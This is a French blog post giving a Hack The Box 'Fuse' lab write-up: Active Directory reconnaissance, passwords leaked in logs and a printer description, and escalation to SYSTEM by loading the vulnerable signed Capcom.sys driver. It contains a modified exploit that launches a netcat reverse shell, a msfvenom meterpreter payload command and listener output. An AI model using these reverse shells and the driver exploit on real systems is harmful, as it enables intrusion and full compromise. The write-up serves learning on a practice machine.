<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>htb fuse</title>
	<link href="https://jurassi.ch/atom.xml" type="application/atom+xml" rel="alternate" title="Atom feed for blog posts">
	<style>
		body {
			font-family: sans-serif;
			margin: 0 auto;
			#max-width: 48rem;
			max-width: 80ch;
			line-height: 1.45;
			padding: 0.5rem 0 1.6rem;
			#box-shadow: 0 0 2rem 0 #bbb;
			#border-radius: 0 0 0.6rem 0.6rem;
		}
		main {
			padding: 0 1.4rem;
			hyphens: auto;
		}
		code {
			background: #eee;
			padding: 0.3rem;
			tab-size: 4;
		}
		pre code {
			display: block;
			overflow-x: auto;
			padding: 0.3rem 0.6rem;
		}

		nav ul {
			margin: 0;
			padding: 0;
			display: flex;
			background: #a11;
		}
		nav li {
			list-style: none;
		}
		nav li * {
			display: block;
			padding: 0.4rem 0.4rem;
			color: white;
		}
		nav li strong {
			padding-left: 1.5rem;
			padding-right: 1rem;
		}
		nav a {
			text-decoration: none;
		}
		nav a:hover {
			background: #ad4949;
		}
	</style>
</head>

<nav>
	<ul>
		<li><strong>Jurassi.ch</strong></li>
		<li><a href="index.html">/home</a></li>
		<li><a href="my-little-art.html">/arts</a></li>
		<li><a href="le-monde-de-demain.html">/le monde de demain</a></li>
                <li><a href="kit-survie.html">/kit de survie</a></li>

	</ul>
</nav>

<main>
<h1>htb fuse</h1>
<p>L'art de <strong>l'exploitation de driver signé</strong> sur un OS 64 bits quand un administrateur a donné les permissions de chargé un driver (<strong>SeLoadDriverPrivilege</strong>) à un utilisateur.</p>
<h1>Recon</h1>
<h2>nmap</h2>
<p>Un port web, un port ldap... Une machine windows semble-t-il.</p>
<pre><code class="language-bash">kali@kali:~/Fuse$ nmap -p- 10.10.10.193
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 01:32 EDT
Nmap scan report for 10.10.10.193
Host is up (0.054s latency).
Not shown: 65514 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown
49690/tcp open  unknown
49745/tcp open  unknown
</code></pre>
<h2>ldapsearch - un domaine AD</h2>
<p>On a un domaine AD : fabricorp.local.</p>
<pre><code class="language-bash">kali@kali:~/Fuse$ ldapsearch -x -h 10.10.10.193 -s base
# extended LDIF
#
# LDAPv3
# base &lt;&gt; (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
currentTime: 20200617072657.0Z
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=fabricorp,DC=loc
 al
dsServiceName: CN=NTDS Settings,CN=FUSE,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=fabricorp,DC=local
namingContexts: DC=fabricorp,DC=local
namingContexts: CN=Configuration,DC=fabricorp,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=fabricorp,DC=local
namingContexts: DC=DomainDnsZones,DC=fabricorp,DC=local
namingContexts: DC=ForestDnsZones,DC=fabricorp,DC=local
defaultNamingContext: DC=fabricorp,DC=local
schemaNamingContext: CN=Schema,CN=Configuration,DC=fabricorp,DC=local
configurationNamingContext: CN=Configuration,DC=fabricorp,DC=local
rootDomainNamingContext: DC=fabricorp,DC=local
...
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
dnsHostName: Fuse.fabricorp.local
ldapServiceName: fabricorp.local:fuse$@FABRICORP.LOCAL
serverName: CN=FUSE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=fabricorp,DC=local
</code></pre>
<h2>website - découverte de comptes users</h2>
<p>Sur le port 80, on a bien un site web. Je confirgure mon fichier hosts.</p>
<pre><code class="language-bash">http://fuse.fabricorp.local/papercut/logs/html/index.htm

sudo vi /etc/hosts
10.10.10.193    fuse.fabricorp.local
</code></pre>
<p>Un joli site "PaperCut".</p>
<p><img src="/assets/img/image-20200617085623377.png" alt="" /></p>
<p>Dans un des fichiers CSV, je découvre quelques utilisateurs, et je pense que j'ai peut être un mot de passe ici.</p>
<p><img src="/assets/img/image-20200617094033662.png" alt="" /></p>
<h2>rcpclient - tester le mdp</h2>
<p>Je teste chaque utilisateur avec ce mot de passe. Pour le compte <em>tlavel</em>, la réponse du serveur est "NT<em>STATUS</em>PASSWORD<em>MUST</em>CHANGE". Ce qui signifie que le mot de passe est correct mais nécessite un changement.</p>
<pre><code class="language-bash">kali@kali:~/Fuse$ rpcclient -U &quot;fabricorp\\perton&quot; 10.10.10.193 
Enter FABRICORP\perton's password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE

kali@kali:~/Fuse$ rpcclient -U &quot;fabricorp\\tlavel&quot; 10.10.10.193 
Enter FABRICORP\tlavel's password: 
Cannot connect to server.  Error was NT_STATUS_PASSWORD_MUST_CHANGE
</code></pre>
<h2>smbpasswd - changer le mdp</h2>
<p>Je renouvelle le mot de passe du compte <code>tlavel</code>.</p>
<pre><code class="language-bash">kali@kali:~/Fuse$ smbpasswd -U &quot;fabricorp\\tlavel&quot; -r 10.10.10.193
Old SMB password: &lt;Fabricorp01&gt;
New SMB password: &lt;p@ssw0rd&gt;
Retype new SMB password: &lt;p@ssw0rd&gt;
Password changed for user tlavel
</code></pre>
<h2>smbclient - enum des shares</h2>
<p>Je constate que vous avons un spooler actif sur ce contrôleur de domaine.</p>
<pre><code class="language-bash">kali@kali:~/fuse$ smbclient -L \\\\10.10.10.193 -U &quot;fabricorp\\tlavel&quot;
Unable to initialize messaging context
Enter FABRICORP\tlavel's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        HP-MFT01        Printer   HP-MFT01
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
</code></pre>
<p>Le mot de passe de <code>tlavel</code> est réinitialisé très rapidement. Il faut être rapide dans les recherches. En lien avec le spooler actif, je vérifie les imprimantes connectées.</p>
<h2>rpcclient - enum des imprimantes</h2>
<pre><code class="language-bash">rpcclient $&gt; enumprinters 
        flags:[0x800000]
        name:[\\10.10.10.193\HP-MFT01]
        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central
        (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
        comment:[]
</code></pre>
<p>La description de l'imprimante contient un mot de passe, pour un compte <code>scan2docs</code> : <strong>$fab@s3Rv1ce$1</strong></p>
<h2>rpcclient - emum des users du domaine</h2>
<pre><code class="language-bash">rpcclient $&gt; enumdomusers
    user:[Administrator] rid:[0x1f4]
    user:[Guest] rid:[0x1f5]
    user:[krbtgt] rid:[0x1f6]
    user:[DefaultAccount] rid:[0x1f7]
    user:[svc-print] rid:[0x450]
    user:[bnielson] rid:[0x451]
    user:[sthompson] rid:[0x641]
    user:[tlavel] rid:[0x642]
    user:[pmerton] rid:[0x643]
    user:[svc-scan] rid:[0x645]
    user:[bhult] rid:[0x1bbd]
    user:[dandrews] rid:[0x1bbe]
    user:[mberbatov] rid:[0x1db1]
    user:[astein] rid:[0x1db2]
    user:[dmuir] rid:[0x1db3]
</code></pre>
<p>Notons que le compte <code>svc-scan</code> sera utile juste après.</p>
<h1>low priv shell</h1>
<p>Je tente d'associer le mot de passe précédemment découvert au compte <strong>svc-print</strong> et c'est gagné :)</p>
<pre><code class="language-bash">kali@kali:~/fuse$ evil-winrm -i 10.10.10.193 -u svc-print
Enter Password: 
Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-print\Documents&gt; 
</code></pre>
<h1>Priv esc</h1>
<h2>SeLoadDriverPrivilege</h2>
<p>Je vérifie d'abord mes privilèges. Il semblerait que je puisse charger un driver. <strong>SeLoadDriverPrivilege</strong> comme son nom le suggère octroie la capacité de charger n'importe quel driver. Et pour faire simple : être capable d'insérer du code dans le kernel  = game over.</p>
<p> </p>
<pre><code class="language-bash">*Evil-WinRM* PS C:\users\svc-print\Desktop&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 </code></pre>
<h2>Capcom.sys Driver Exploit</h2>
<p>Sur les systèmes 64bits, le Kernel Mode Code Signing (KMCS) est activé, et il est <strong>impossible</strong> de charger un driver <strong>non signé</strong>. Il s'agit là au mieux d'une fonctionnalité pour assurer l'intégrité du code, souvent présentée comme une fonction de sécurité. Rien empêche toutefois un attaquant de charger <strong>un driver signé vulnérable</strong> et de l'exploiter. L'intégrité du kernel serait compromise.</p>
<p>Utilisons un driver bien connu pour être vulnérable et signé ! <strong>Capcom.sys</strong>. Il peut être téléchargé ici :</p>
<p>https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys</p>
<p>On aura besoin de compiler ces deux exploits.</p>
<ul>
<li><p>https://github.com/tandasat/ExploitCapcom</p>
</li>
<li><p>https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp</p>
</li>
</ul>
<h2>ExploitCapcom.cpp</h2>
<p>Je modifie la ligne 292 du POC ExploitCapcom.cpp [^1] pour obtenir un reverse shell avec un netcat. Je m'apercevrai plus tard que netcat ne fonctionnera pas. J'utiliserai alors un meterpreter. J'y reviendrai.</p>
<p>Modifier :</p>
<pre><code class="language-bash">static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT(&quot;C:\\Windows\\system32\\cmd.exe&quot;);
</code></pre>
<p>en :</p>
<pre><code class="language-bash">static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT(&quot;C:\\test\\nc.exe -nv 10.10.14.35 443&quot;);
</code></pre>
<p>Et je le compile ExploitCapcom.cpp avec VS2015.</p>
<h2>EoPLoadDriver.cpp</h2>
<p>Je compile également : EoPLoadDriver.cpp [^2]. Il faut passer par un nouveau projet <code>Console App</code> et importer le code c++.</p>
<ol>
<li>New &gt; Project &gt; Visual C++ &gt; Win32 &gt; Console App</li>
<li>Source File &gt; Add &gt; Existing Item</li>
<li>Barre d'outils, choisir Release / x64</li>
<li>F5 pour compiler</li>
</ol>
<h2>Préparation</h2>
<p>Grâce à mon shell Evil-WinRM, j'upload nc.exe dans <code>c:\test</code>.</p>
<pre><code class="language-bash">*Evil-WinRM* PS C:\test&gt; upload /usr/share/windows-resources/binaries/nc.exe
</code></pre>
<p>J'upload le driver et les deux codes compilés.</p>
<pre><code class="language-bash">*Evil-WinRM* PS C:\test&gt; upload Capcom.sys
*Evil-WinRM* PS C:\test&gt; upload ExploitCapcom.exe
*Evil-WinRM* PS C:\test&gt; upload eoploaddriver.exe
</code></pre>
<p>Je charge le driver Capcom.sys sur la victime.</p>
<pre><code class="language-bash">*Evil-WinRM* PS C:\test&gt; .\eoploaddriver.exe System\CurrentControlSet\MyService c:\test\Capcom.sys
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService
NTSTATUS: 00000000, WinError: 0
</code></pre>
<h2>Exploit</h2>
<p>Maintenant je peux utiliser le driver chargé pour l'exploiter et exécuter du code arbitraire, à savoir un reverse shell en tant que SYSTEM.</p>
<p>Et je lance l'exploit. 1er essai avec un reverse shell netcat échoué.</p>
<pre><code class="language-bash">*Evil-WinRM* PS C:\test&gt; .\ExploitCapcom.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000068
[*] Shellcode was placed at 0000029108910008
[+] Shellcode was executed
[+] Token stealing was successful
[-] CreateProcess() failed
</code></pre>
<p>Alors j'opte pour un meterpreter.</p>
<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.35 LPORT=443 -f exe &gt; shell.exe
</code></pre>
<p>Je modifie le code de ExploitCapcom.cpp pour appeler shell.exe</p>
<pre><code class="language-bash">static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT(&quot;C:\\test\\shell.exe&quot;);
</code></pre>
<p>J'upload shell.exe et je lance l'exploit.</p>
<pre><code class="language-bash">*Evil-WinRM* PS C:\test&gt; upload shell.exe
*Evil-WinRM* PS C:\test&gt; .\ExploitCapcom.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 000002345ED10008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
</code></pre>
<p>Et sur mon listener metasploit, j'obtiens mon reverse shell.</p>
<pre><code class="language-bash">msf5 &gt; use exploit/multi/handler 
msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &gt; set lhost 10.10.14.35
lhost =&gt; 10.10.14.35
msf5 exploit(multi/handler) &gt; set lport 443
lport =&gt; 443
msf5 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 10.10.14.35:443 
[*] Sending stage (180291 bytes) to 10.10.10.193
[*] Meterpreter session 1 opened (10.10.14.35:443 -&gt; 10.10.10.193:55890) at 2020-07-01 09:56:48 -0400

meterpreter &gt; 
</code></pre>
<p><img src="/assets/img/image-20200701161904745.png" alt="" /></p>
<h3>Alternative VbLoadDriver.exe</h3>
<p>En alternative au code EoPLoadDriver.cpp en c++, il existe une version dotnet : VbLoadDriver.exe</p>
<p>https://github.com/VbScrub/VbLoadDriver/raw/master/VbLoadDriver.exe</p>
<p>On upload... Puis il nous faut le SID de l'utilisateur :</p>
<pre><code class="language-bash">*Evil-WinRM* PS C:\users\svc-print\Documents&gt; get-aduser svc-print


DistinguishedName : CN=svc-print,CN=Users,DC=fabricorp,DC=local
Enabled           : True
GivenName         :
Name              : svc-print
ObjectClass       : user
ObjectGUID        : d3482aa7-6cd7-4547-83c5-74ed2bc605fd
SamAccountName    : svc-print
SID               : S-1-5-21-2633719317-1471316042-3957863514-1104
Surname           :
UserPrincipalName :
</code></pre>
<pre><code class="language-bash">*Evil-WinRM* PS C:\users\svc-print\Documents&gt; .\VbLoadDriver.exe HKU\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService C:\users\svc-print\Documents\capcom.sys
VbLoadDriver
http://vbscrub.com

Attempting to enable SeLoadDriverPrivilege...
Successfully enabled privilege
Creating registry values...
Successfully created registry values
Loading driver...
Successfully loaded driver
*Evil-WinRM* PS C:\users\svc-print\Documents&gt; 

</code></pre>
<p>[^2]: https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp
[^1]: https://github.com/tandasat/ExploitCapcom</p>
<small>Written on 2023-09-11.</small>
</main>
